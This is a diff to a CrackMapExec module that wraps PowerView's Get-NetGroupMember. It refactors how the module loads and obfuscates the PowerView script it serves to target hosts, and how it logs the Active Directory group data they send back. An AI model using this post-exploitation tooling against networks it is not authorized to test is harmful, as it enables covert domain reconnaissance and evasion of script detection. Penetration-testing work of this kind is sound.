@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, obfs_ps_script
+from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
 from StringIO import StringIO
 from datetime import datetime
 
@@ -8,7 +8,9 @@ class CMEModule:
         Module by @byt3bl33d3r
     '''
 
-    name = 'GetGroupMembers'
+    name = 'getgroupmembers'
+
+    description = "Wrapper for PowerView's Get-NetGroupMember function"
 
     def options(self, context, module_options):
         '''
@@ -63,7 +65,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open('data/PowerSploit/Recon/PowerView.ps1', 'r') as ps_script:
+            with open(get_ps_script('Recon/PowerView.ps1'), 'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read())
                 request.wfile.write(ps_script)
 
@@ -89,6 +91,5 @@ class CMEModule:
             print_post_data(data)
 
             log_name = 'GroupMembers-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
-            with open('logs/' + log_name, 'w') as log_file:
-                log_file.write(data)
+            write_log(data, log_name)
             context.log.info("Saved output to {}".format(log_name))
